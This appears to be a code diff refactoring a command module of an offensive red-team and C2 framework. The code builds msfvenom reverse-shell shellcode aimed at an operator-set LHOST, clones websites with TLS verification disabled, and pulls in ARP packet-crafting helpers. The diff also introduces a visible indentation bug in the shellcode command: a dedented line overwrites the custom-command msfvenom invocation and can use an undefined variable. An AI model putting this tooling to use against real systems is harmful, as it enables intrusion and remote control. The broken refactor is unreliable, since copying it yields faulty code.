@@ -6,14 +6,24 @@ this set is registered by ``cli.registry``.
 
 from __future__ import annotations
 
-import base64
+import glob
+import json
+import os
+import shlex
+import shutil
+import subprocess
+import sys
+import time
+from datetime import datetime
+from pathlib import Path
 
 import cmd2
+import requests
 
-from cli.commands._base import LazyOwnCommandSet
 from cli.aliases import load_aliases as _load_aliases
 from cli.assign import apply_assign as _apply_assign
 from cli.autosuggest import render_hint_line as _render_autosuggest_hint
+from cli.commands._base import LazyOwnCommandSet
 from cli.ops_commands import loot_graph as _loot_graph
 from cli.ops_commands import loot_mark as _loot_mark
 from cli.ops_commands import loot_reuse as _loot_reuse
@@ -36,6 +46,25 @@ from modules.module_registry import ModuleRegistry as _ModuleRegistry
 from modules.module_registry import format_module_detail as _format_module_detail
 from modules.module_registry import format_module_table as _format_module_table
 from modules.payload_factory import format_payload_table as _format_payload_table
+from utils import (
+    BG_BLACK,
+    BOLD,
+    CYAN,
+    GREEN,
+    MAGENTA,
+    RESET,
+    WHITE,
+    YELLOW,
+    check_sudo,
+    create_arp_packet,
+    generate_certificates,
+    is_binary_present,
+    parse_ip_mac,
+    print_error,
+    print_msg,
+    print_warn,
+    send_packet,
+)
 
 __all__ = ["SessionOpsCommandSet"]
 
@@ -282,7 +311,7 @@ class SessionOpsCommandSet(LazyOwnCommandSet):
         in ``sessions/<id>/``. The default tenant always exists.
         """
         try:
-            from modules.lazy_rbac import TenantManager, get_tenant_manager
+            from modules.lazy_rbac import get_tenant_manager
         except ImportError:
             print_error("Multi-tenancy module not available.")
             return
@@ -1143,8 +1172,6 @@ class SessionOpsCommandSet(LazyOwnCommandSet):
         parts   = line.split() if line.strip() else []
         handle  = parts[0] if parts and not parts[0].startswith("-") else "operator"
         curl    = "--curl" in parts
-        lhost   = self.params['lhost'] or "localhost"
-        c2_port = self.params['c2_port'] or 4444
         base    = f"https://{self.params['lhost']}:{self.params['c2_port']}"
         ui_url  = f"{base}/collab/?operator={handle}"
         sse_url = f"{base}/collab/stream?operator={handle}"
@@ -1383,7 +1410,7 @@ class SessionOpsCommandSet(LazyOwnCommandSet):
 
         print_msg("Cloning website: " + url)
         try:
-            web_request = requests.get(url, headers={'User-Agent': useragent}, verify=False)
+            web_request = requests.get(url, headers={'User-Agent': useragent}, verify=False)  # noqa: S501
             if web_request.status_code != 200 or len(web_request.content) < 1:
                 print_error("Unable to clone the site. Status Code: {}".format(web_request.status_code))
                 return
@@ -1500,15 +1527,18 @@ class SessionOpsCommandSet(LazyOwnCommandSet):
                 msf_cmd = f'msfvenom -p {payload} {cmd_opt} -f c -o sessions/shellcode_cmd_{args.os}_{args.arch}.txt'
             else:
                 # For bash or generic commands
-                msf_cmd = f'msfvenom -p {payload} LHOST={args.self.params['lhost']} LPORT={args.lport} -f c -o sessions/shellcode_cmd_{args.os}_{args.arch}.txt'
+                lhost = args.self.params["lhost"]
+            msf_cmd = f"msfvenom -p {payload} LHOST={lhost} LPORT={args.lport} -f c -o sessions/shellcode_cmd_{args.os}_{args.arch}.txt"
 
             output_file = f"sessions/shellcode_cmd_{args.os}_{args.arch}.txt"
             desc = f"Custom command: {args.command[:50]}..."
 
         elif args.payload:
             payload = args.payload
-            msf_cmd = f'msfvenom -p {payload} LHOST={args.self.params['lhost']} LPORT={args.lport} -f c -o sessions/shellcode_{payload.replace("/", "_")}_{args.self.params['lhost']}_{args.lport}.txt'
-            output_file = f"sessions/shellcode_{payload.replace('/', '_')}_{args.self.params['lhost']}_{args.lport}.txt"
+            lhost = args.self.params["lhost"]
+            safe_payload = payload.replace("/", "_")
+            msf_cmd = f"msfvenom -p {payload} LHOST={lhost} LPORT={args.lport} -f c -o sessions/shellcode_{safe_payload}_{lhost}_{args.lport}.txt"
+            output_file = f"sessions/shellcode_{safe_payload}_{lhost}_{args.lport}.txt"
             desc = f"Reverse shell: {payload}"
         else:
             self.display_toastr("Either --payload or --command is required.", type="error")
@@ -1524,19 +1554,3 @@ class SessionOpsCommandSet(LazyOwnCommandSet):
         else:
             self.display_toastr("Failed to generate shellcode. Check msfvenom output.", type="error")
 
-
-import utils as _lazy_utils
-
-for _lazy_name in dir(_lazy_utils):
-    if not _lazy_name.startswith('_'):
-        globals().setdefault(_lazy_name, getattr(_lazy_utils, _lazy_name))
-del _lazy_utils, _lazy_name
-
-
-def __getattr__(name: str):
-    """Fall back to ``utils`` for bare-name references used by migrated commands."""
-    import utils as _utils
-    try:
-        return getattr(_utils, name)
-    except AttributeError:
-        raise AttributeError(f"module {__name__!r} has no attribute {name!r}") from None
